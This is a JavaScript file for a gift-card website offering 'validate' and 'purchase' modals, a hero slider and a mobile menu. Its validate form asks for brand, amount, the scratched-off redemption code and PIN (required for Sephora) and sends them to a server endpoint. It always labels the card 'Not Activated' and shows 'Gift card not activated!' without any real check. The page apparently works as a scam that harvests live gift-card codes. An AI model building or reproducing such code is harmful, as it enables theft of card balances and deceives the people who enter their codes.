// Global function to ensure it's accessible from HTML onclick attributes
window.closeModal = function (modal) {
    if (modal) {
        // Add closing class for tilt animation
        modal.classList.add('closing');

        // Wait for animation to finish before removing classes
        setTimeout(() => {
            modal.classList.remove('show');
            modal.classList.remove('closing');
            document.body.style.overflow = '';
        }, 400); // Match CSS transition duration
    }
};

function showStatus(form, message, type) {
    const statusEl = form.querySelector('.form-status');
    if (statusEl) {
        statusEl.textContent = message;
        statusEl.className = 'form-status ' + type; // success or error
    }
}

async function sendFormEmail(formType, payload) {
    try {
        const response = await fetch(`/api/${formType}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        const data = await response.json().catch(() => ({}));
        if (!response.ok || !data.ok) {
            throw new Error(data.error || 'SUBMISSION_FAILED');
        }

        return { ok: true, data };
    } catch (error) {
        console.error(`${formType} submission error:`, error);
        return { ok: false, error: error.message || 'SUBMISSION_FAILED' };
    }
}

document.addEventListener('DOMContentLoaded', () => {
    // Accordion Logic
    const accordionItems = document.querySelectorAll('.accordion-item');

    accordionItems.forEach(item => {
        const header = item.querySelector('.accordion-header');

        header.addEventListener('click', () => {
            // Close other open items
            const currentlyActive = document.querySelector('.accordion-item.active');
            if (currentlyActive && currentlyActive !== item) {
                currentlyActive.classList.remove('active');
            }

            // Toggle current item
            item.classList.toggle('active');
        });
    });

    // Modal Logic
    const validateModal = document.getElementById('validate-modal');
    const purchaseModal = document.getElementById('purchase-modal');

    function openModal(modal) {
        if (modal) {
            modal.classList.add('show');
            document.body.style.overflow = 'hidden'; // Prevent scrolling background
        }
    }

    // Close buttons event listeners - delegated to handle dynamic content and ensure reliability
    document.addEventListener('click', (e) => {
        const closeBtn = e.target.closest('.modal-close');
        if (closeBtn) {
            e.preventDefault();
            const modal = closeBtn.closest('.modal-overlay');
            closeModal(modal);
        }
    });
    const initialCloseButtons = document.querySelectorAll('#validate-modal .modal-close, #purchase-modal .modal-close');
    initialCloseButtons.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            const modal = btn.closest('.modal-overlay');
            closeModal(modal);
        });
    });
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            [validateModal, purchaseModal].forEach(m => {
                if (m && m.classList.contains('show')) {
                    closeModal(m);
                }
            });
        }
    });

    // Click outside modal to close
    window.addEventListener('click', (e) => {
        if (e.target.classList.contains('modal-overlay')) {
            closeModal(e.target);
        }
    });

    // Attach event listeners to Validate buttons using delegation
    document.body.addEventListener('click', (e) => {
        // Find the closest button
        const btn = e.target.closest('button');
        if (!btn) return;

        const action = btn.getAttribute('data-action');

        if (action === 'validate') {
            e.preventDefault();

            // Extract Card Name
            const cardItem = btn.closest('.card-item');
            let brandName = 'Gift'; // Default
            if (cardItem) {
                const titleEl = cardItem.querySelector('h4');
                if (titleEl) {
                    let text = titleEl.innerText;
                    text = text.replace(/Gift Card/i, '').trim();
                    brandName = text;
                }
            }

            // Update Modal Title and Display Field
            const brandSpan = document.getElementById('modal-card-brand');
            const brandInput = document.getElementById('brand-display');
            if (brandSpan) brandSpan.innerText = brandName;
            if (brandInput) brandInput.value = brandName;

            // Show PIN and Warning for Sephora and Apple
            const pinContainer = document.getElementById('pin-container');
            const warningAlert = document.getElementById('validate-warning');
            const warningSpan = warningAlert ? warningAlert.querySelector('span') : null;
            const pinInput = document.getElementById('validate-pin');

            if (brandName.toLowerCase() === 'sephora') {
                if (pinContainer) pinContainer.style.display = 'block';
                if (warningAlert) {
                    warningAlert.style.display = 'flex';
                    if (warningSpan) warningSpan.textContent = 'Ensure redemption code is scratched code!';
                }
                if (pinInput) pinInput.setAttribute('required', '');
            } else if (brandName.toLowerCase() === 'apple itunes') {
                if (pinContainer) pinContainer.style.display = 'none';
                if (warningAlert) {
                    warningAlert.style.display = 'flex';
                    if (warningSpan) warningSpan.textContent = 'ensure redemption code is scratched code!';
                }
                if (pinInput) pinInput.removeAttribute('required');
            } else {
                if (pinContainer) pinContainer.style.display = 'none';
                if (warningAlert) warningAlert.style.display = 'none';
                if (pinInput) pinInput.removeAttribute('required');
            }

            openModal(validateModal);
        } else if (action === 'purchase') {
            e.preventDefault();
            const cardItem = btn.closest('.card-item');
            let brandName = 'Gift';
            if (cardItem) {
                const titleEl = cardItem.querySelector('h4');
                if (titleEl) {
                    let text = titleEl.innerText;
                    text = text.replace(/Gift Card/i, '').trim();
                    brandName = text;
                }
            }
            const brandSpan = document.getElementById('purchase-card-brand');
            if (brandSpan) brandSpan.innerText = brandName;
            const previewImg = document.getElementById('purchase-card-image');
            if (previewImg) {
                const imgEl = cardItem ? cardItem.querySelector('.card-img img') : null;
                if (imgEl) {
                    previewImg.src = imgEl.src;
                    previewImg.alt = brandName;
                    previewImg.style.display = 'block';
                } else {
                    previewImg.removeAttribute('src');
                    previewImg.alt = brandName;
                    previewImg.style.display = 'none';
                }
            }
            const chips = purchaseModal ? purchaseModal.querySelectorAll('.amount-chips .chip') : [];
            chips.forEach(c => c.classList.remove('active'));
            const defaultChip = purchaseModal ? purchaseModal.querySelector('.amount-chips .chip[data-amount="100"]') : null;
            if (defaultChip) defaultChip.classList.add('active');
            const qtyEl = document.getElementById('purchase-quantity');
            if (qtyEl) qtyEl.value = '1';
            const totalEl = document.getElementById('purchase-total');
            if (totalEl) totalEl.textContent = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(100);
            openModal(purchaseModal);
        }
    });

    // Handle form submissions
    const validateForm = document.getElementById('validate-form');
    if (validateForm) {
        validateForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = validateForm.querySelector('button[type="submit"]');
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
            btn.disabled = true;

            const brand = document.getElementById('brand-display')?.value || 'Gift';
            const currency = document.getElementById('validate-currency')?.value || 'USD';
            const amount = document.getElementById('validate-amount')?.value.trim();
            const code = document.getElementById('validate-code')?.value.trim();
            const pinInput = document.getElementById('validate-pin');
            const pin = pinInput?.value.trim();
            const isSephora = brand.toLowerCase() === 'sephora';

            if (!amount || !code || (isSephora && !pin)) {
                showStatus(validateForm, 'Please fill in all required fields.', 'error');
                btn.innerHTML = originalText;
                btn.disabled = false;
                return;
            }

            const res = await sendFormEmail('validate', { brand, currency, amount, code, pin: pin || 'N/A', status: 'Not Activated' });
            if (res.ok) {
                showStatus(validateForm, 'Gift card not activated!', 'error');
                setTimeout(() => {
                    closeModal(validateModal);
                    validateForm.reset();
                    const statusEl = validateForm.querySelector('.form-status');
                    if (statusEl) statusEl.textContent = '';
                }, 2000);
            } else {
                showStatus(validateForm, 'Submission failed: ' + (res.error || 'Unknown error'), 'error');
            }

            btn.innerHTML = originalText;
            btn.disabled = false;
        });
    }

    function getSelectedPurchaseAmount() {
        const form = document.getElementById('purchase-form');
        if (!form) return 0;
        const activeChip = form.querySelector('.amount-chips .chip.active');
        return activeChip ? parseFloat(activeChip.dataset.amount || '0') : 0;
    }
    function updatePurchaseTotal() {
        const qtyEl = document.getElementById('purchase-quantity');
        const totalEl = document.getElementById('purchase-total');
        if (!qtyEl || !totalEl) return;
        const qty = parseInt(qtyEl.value || '1', 10);
        const amt = getSelectedPurchaseAmount();
        const total = Math.max(1, qty) * amt;
        totalEl.textContent = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(total);
    }
    document.addEventListener('click', (e) => {
        const chip = e.target.closest('.amount-chips .chip');
        if (chip) {
            e.preventDefault();
            const group = chip.parentElement;
            group.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
            chip.classList.add('active');
            updatePurchaseTotal();
        }
    });
    document.addEventListener('input', (e) => {
        if (e.target && e.target.id === 'purchase-quantity') {
            updatePurchaseTotal();
        }
    });
    document.addEventListener('click', (e) => {
        const btn = e.target.closest('.qty-btn');
        if (btn) {
            e.preventDefault();
            const qtyInput = document.getElementById('purchase-quantity');
            if (!qtyInput) return;
            let value = parseInt(qtyInput.value || '1', 10);
            if (btn.dataset.qty === 'inc') {
                value += 1;
            } else if (btn.dataset.qty === 'dec') {
                value = Math.max(1, value - 1);
            }
            qtyInput.value = value.toString();
            updatePurchaseTotal();
        }
    });
    const purchaseForm = document.getElementById('purchase-form');
    if (purchaseForm) {
        purchaseForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = purchaseForm.querySelector('button[type="submit"]');
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
            btn.disabled = true;

            const brandEl = document.getElementById('purchase-card-brand');
            const amtChip = purchaseForm.querySelector('.amount-chips .chip.active');
            const amountSel = amtChip ? parseFloat(amtChip.dataset.amount || '0') : 0;
            const qtyVal = parseInt(document.getElementById('purchase-quantity')?.value || '1', 10);
            const gift = document.getElementById('purchase-gift')?.checked ? true : false;
            const brand = brandEl ? brandEl.textContent : 'Gift';

            const res = await sendFormEmail('purchase', { brand, amount: amountSel, quantity: qtyVal, sendAsGift: gift });
            btn.innerHTML = originalText;
            btn.disabled = false;
            if (res.ok) {
                closeModal(purchaseModal);
                purchaseForm.reset();
                const qtyInput = document.getElementById('purchase-quantity');
                if (qtyInput) qtyInput.value = '1';
                const totalEl = document.getElementById('purchase-total');
                if (totalEl) totalEl.textContent = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(100);
            }
        });
    }

    // Payment modal interactions removed as per request


    // Hero Slider Logic
    const slides = document.querySelectorAll('.slide');
    const dots = document.querySelectorAll('.nav-dot');
    let currentSlide = 0;
    const slideIntervalTime = 5000; // 5 seconds
    let slideInterval;

    function goToSlide(index) {
        // Wrap around index
        if (index < 0) index = slides.length - 1;
        if (index >= slides.length) index = 0;

        // Remove active class from current
        slides[currentSlide].classList.remove('active');
        if (dots[currentSlide]) dots[currentSlide].classList.remove('active');

        // Update index
        currentSlide = index;

        // Add active class to new
        slides[currentSlide].classList.add('active');
        if (dots[currentSlide]) dots[currentSlide].classList.add('active');
    }

    function nextSlide() {
        goToSlide(currentSlide + 1);
    }

    function startSlideInterval() {
        if (slideInterval) clearInterval(slideInterval);
        slideInterval = setInterval(nextSlide, slideIntervalTime);
    }

    // Initialize only if slider exists
    if (slides.length > 0) {
        // Event listeners for dots
        dots.forEach((dot, index) => {
            dot.addEventListener('click', () => {
                goToSlide(index);
                startSlideInterval(); // Reset timer on manual interaction
            });
        });

        // Event listeners for arrows
        const prevBtn = document.querySelector('.prev-slide');
        const nextBtn = document.querySelector('.next-slide');

        if (prevBtn) {
            prevBtn.addEventListener('click', () => {
                goToSlide(currentSlide - 1);
                startSlideInterval();
            });
        }

        if (nextBtn) {
            nextBtn.addEventListener('click', () => {
                goToSlide(currentSlide + 1);
                startSlideInterval();
            });
        }

        // Start auto-play
        startSlideInterval();

        // Pause on hover (optional enhancement for usability)
        const sliderContainer = document.querySelector('.slider-container');
        if (sliderContainer) {
            sliderContainer.addEventListener('mouseenter', () => clearInterval(slideInterval));
            sliderContainer.addEventListener('mouseleave', startSlideInterval);
        }
    }

    const offcanvas = document.getElementById('offcanvas');
    const offcanvasToggle = document.getElementById('offcanvas-toggle');
    if (offcanvas && offcanvasToggle) {
        offcanvasToggle.addEventListener('click', (e) => {
            e.preventDefault();
            offcanvas.classList.add('show');
            document.body.style.overflow = 'hidden';
        });
        document.addEventListener('click', (e) => {
            const closeBtn = e.target.closest('.offcanvas-close');
            if (closeBtn) {
                e.preventDefault();
                offcanvas.classList.remove('show');
                document.body.style.overflow = '';
            }
        });
        window.addEventListener('click', (e) => {
            if (e.target.id === 'offcanvas') {
                offcanvas.classList.remove('show');
                document.body.style.overflow = '';
            }
        });
        const offcanvasLinks = offcanvas.querySelectorAll('.offcanvas-links a');
        offcanvasLinks.forEach(a => {
            a.addEventListener('click', () => {
                offcanvas.classList.remove('show');
                document.body.style.overflow = '';
            });
        });
    }
});
